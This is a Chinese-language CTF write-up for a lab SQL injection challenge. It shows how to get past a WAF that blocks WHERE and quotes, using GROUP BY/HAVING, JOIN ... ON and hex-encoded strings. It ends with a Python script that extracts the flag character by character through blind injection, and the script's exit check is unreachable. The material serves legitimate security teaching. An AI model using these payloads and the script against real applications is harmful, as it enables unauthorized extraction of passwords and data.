---
title: 过滤绕过-where与引号-having与join
category: SQL注入/过滤绕过
tags: [ctfshow, web184, having, where, group by, join, 十六进制, 0x]
order: 16
---

## 一句话概括

`WHERE` 被 WAF 拉黑时，可以用 `GROUP BY ... HAVING ...` 顶替它，因为 `HAVING` 也能做条件过滤，只是发生在分组之后。引号被拉黑时，用十六进制 `0x63746625` 代替字符串 `'ctf%'`。

## 被过滤的东西 → 绕过手法对照表

| 被过滤的东西 | 绕过手法 | 等价性来源 |
|---|---|---|
| `where` | `group by 列 having 列 like ...` | `HAVING` 同样能做条件过滤，只是执行阶段不同 |
| `where` | `join ... on 条件` | `ON` 子句也是条件过滤，附着在 JOIN 上 |
| 单引号 `'` | 十六进制 `0x63746625` | MySQL 会把 `0x...` 当字符串字面量使用 |
| 单引号 `'` | `char(99,116,102,37)` / `unhex('63746625')` | 用函数构造字符串，无需引号 |

## 原理：WHERE 和 HAVING 的区别

关键在于 SQL 各子句的执行阶段不同：

```sql
SELECT column1, column2...
FROM table
WHERE condition           -- 行级过滤：分组之前，逐行筛
GROUP BY column
HAVING condition          -- 组级过滤：分组之后，对每个组筛
ORDER BY column
```

| | WHERE | HAVING |
|---|---|---|
| 执行时机 | 分组前 | 分组后 |
| 过滤对象 | 单条记录（行） | 一个分组（组） |
| 能否用聚合函数 | 不能 | 能（如 `count(*) > 1`） |

- WHERE 是行级过滤

  ```sql
  SELECT count(*) FROM ctfshow_user
  WHERE pass = 'ctfshow{abc}'   -- 逐行检查 pass 字段
  ```

- HAVING 是组级过滤

  ```sql
  SELECT count(*) FROM ctfshow_user
  GROUP BY pass                 -- 先按 pass 分组
  HAVING pass = 'ctfshow{abc}'  -- 再过滤整个组
  ```

## 为什么 HAVING 能当 WHERE 用

`HAVING` 本来是给聚合函数准备的（`HAVING cnt > 1`），但 MySQL 的语法比较宽松，允许在 `HAVING` 里直接引用 `GROUP BY` 用的那个列。于是：

```sql
-- 单字段分组时，这两种写法结果相同
SELECT count(*) FROM table WHERE field = 'value'
SELECT count(*) FROM table GROUP BY field HAVING field = 'value'
```

逻辑上等价：`GROUP BY pass HAVING pass...` 约等于 `WHERE pass...`。

- 正常用法（统计每个 pass 的记录数，只看多于 1 条的组）：

  ```sql
  SELECT pass, count(*) as cnt
  FROM ctfshow_user
  GROUP BY pass
  HAVING cnt > 1;
  ```

- 注入利用：

  ```sql
  SELECT count(*)
  FROM ctfshow_user
  GROUP BY pass
  HAVING pass regexp '^ctfshow{a';
  ```

## 本题情景与解题手法

### 题目形态

题目 `POST` 一个 `tableName` 参数，后端直接把它拼在 `count(pass) from` 后面：

```php
// 拼接 sql 语句查找指定 ID 用户
$sql = "select count(pass) from ".$_POST['tableName'].";";
```

WAF 拉黑了 `where`，所以我们没法用最直观的 `where pass like ...`。

### 第一步：先想正常写法（会被拦）

```sql
ctfshow_user where pass like 0x63746625
```

这里 `0x63746625` 就是 `'ctf%'` 的十六进制：

| 十六进制 | 字符 |
|---|---|
| `63` | `c` |
| `74` | `t` |
| `66` | `f` |
| `25` | `%` |

`waf` 拉黑了单引号，所以不能写 `'ctf%'`；MySQL 允许把 `0x...` 直接当字符串用，于是 `like 0x63746625` 等价于 `like 'ctf%'`，不需要任何引号。

但 `where` 被拦，这条走不通。

### 第二步：把 where 换成 group by + having

```sql
ctfshow_user group by pass having pass like 0x63746625
```

- `group by pass`：先按密码分组；
- `having pass like 0x...`：对每个组做模糊匹配。

WAF 只认识 `where`，不认识 `having`，于是放行；而 MySQL 里两者效果一致。

注意 `having` 后面必须带上列名：写成 `having pass like 0x...` 才能跑通，漏掉列名的 `having like 0x...` 不行。

### 第三步：爆破脚本

```python
import requests

url = "http://靶机地址/select-waf.php"
flagstr = "{}abcdefghijklmnopqr-stuvwxyz0123456789"
flag = 'ctfshow{'

def asc2hex(s):
    a1 = ''
    a2 = ''
    for i in s:
        a1 += hex(ord(i))          # 每个字符转成 0x?? 形式
    a2 = a1.replace("0x", "")      # 去掉 0x
    return a2

for i in range(100):
    for j in flagstr:
        payload = {
            # 把「已猜前缀 + 新字符 + %」整体转成十六进制
            "tableName": "ctfshow_user group by pass having pass like {}"
                         .format("0x" + asc2hex(flag + j + "%"))
        }
        r = requests.post(url=url, data=payload).text
        if "$user_count = 1;" in r:   # 命中分组 → 字符正确
            flag += j
            print(flag)
            break
            if j == "}":
                sys.exit()
```

脚本逻辑：把已猜出的前缀、试探字符、`%` 整体转成十六进制，让数据库做 `like` 前缀匹配；一旦页面出现 `$user_count = 1;`，说明这个字符对了，追加进 `flag` 继续猜下一位。

### 注入手法一句话总结

`where` 被拦就改 `group by pass having pass like ...`（过滤时机从行级挪到组级，效果等价）；引号被拦就用 `like 0x63746625`（十六进制当字符串，免引号）；再用 `like` 做前缀匹配逐字符爆破。

## 另一种绕法：JOIN 的 ON 子句

`where` 被拉黑时，除了 `having`，还可以把条件挂在 `JOIN ... ON` 上：

```sql
select count(pass) from ctfshow_user a
join ctfshow_user b on b.pass like 0x63746625;
```

`ON` 子句和 `WHERE` 一样是条件判断，而且它天然属于 `JOIN` 语法，不在 `where` 关键字黑名单的覆盖范围内。具体语句要按题目实际表结构调整。

## 注意事项

- 必须 `group by` 才能用 `having`：`HAVING` 是组级过滤，没有 `GROUP BY` 时它作用于整张表（此时也可用，但语义上容易踩坑），配合 `group by pass` 才能逐组匹配。
- `0x` 十六进制在字符串上下文里才当字符串：`like 0x63746625` 可以；如果拿它和数字比较，语义会变成二进制数值。
- `%` 是 LIKE 的通配符：脚本每次拼一个 `%` 在末尾，就是在做前缀匹配，一次比较就能确认已猜前缀是否正确。
- 判据 `$user_count = 1;`：页面把 `count(pass)` 的结果回显出来了，命中分组时值为 1，这是布尔判断的依据。
- `regexp` 也能替代 `like`：`having pass regexp 0x5e637466`（`^ctf` 的 hex）效果类似，选哪个取决于哪个函数没被拦。
